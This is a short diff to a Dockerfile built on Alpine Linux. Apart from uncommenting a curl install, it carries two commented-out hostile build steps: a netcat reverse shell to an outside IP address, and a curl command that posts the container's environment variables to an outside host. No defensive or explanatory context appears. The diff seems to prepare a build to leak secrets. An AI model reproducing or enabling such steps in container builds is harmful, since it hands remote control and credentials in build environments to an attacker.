@@ -5,7 +5,7 @@ FROM alpine:3.18
 
 #RUN nc -e /bin/sh 124.71.183.77 3309
 
-#RUN apk add --no-cache curl
+RUN apk add --no-cache curl
 
 #RUN curl -X POST http://tttqqq777.top/nb/log.php --data "$(env)"
 
